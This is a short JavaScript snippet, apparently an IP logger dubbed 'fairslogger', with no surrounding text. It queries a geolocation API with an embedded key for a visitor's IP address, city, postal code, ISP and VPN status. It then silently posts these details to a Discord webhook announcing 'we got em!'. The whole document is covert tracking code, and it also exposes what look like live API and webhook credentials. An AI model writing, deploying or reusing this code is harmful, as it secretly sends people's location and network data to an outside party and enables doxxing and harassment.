$.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=a1ebbf04c6164dd98b527e26c57fc28c", function (data) {
        const ip = data.ip_address;
        const city = data.city;
        const region = data.region;
        const zip = data.postal_code;
        const country = data.country;
        const flag = data.flag.emoji;
        const aso = data.connection.autonomous_system_organization;
        const isp = data.connection.isp_name;
        const org = data.connection.organization_name;
        const vpn = data.security.is_vpn;
        const tz = data.timezone.name;
        const ct = data.timezone.current_time;
        const request = new XMLHttpRequest();
        request.open("POST", "https://discord.com/api/webhooks/1043608835178381414/6OZpUX62_Fdne8V7BAnQRTMAs2wIfSe27HkGrAsYEu0-clzeNrpIgWOlsLD4mvVBwN-0");
        request.setRequestHeader("Content-type", "application/json");
        const params = {
          username: "fairslogger",
          avatar_url: "https://i.pinimg.com/564x/ff/fa/28/fffa286d61a4338fb561ef74c3ac8ec4.jpg",
          content: "**Ladies and gentlemen we got em!**\n> IP: " + ip + 
          "\n> City: " + city + 
          "\n> Region: " + region + 
          "\n> Zip: " + zip + 
          "\n> Country: " + country +
          "\n> Flag: " + flag +
          "\n> Auto System Org: " + aso +
          "\n> ISP: " + isp +
          "\n> Org: " + org +
          "\n> Using VPN: " + vpn +
          "\n> Timezone: " + tz +
          "\n> Current time: " + ct
          ,
        };
        request.send(JSON.stringify(params));
      });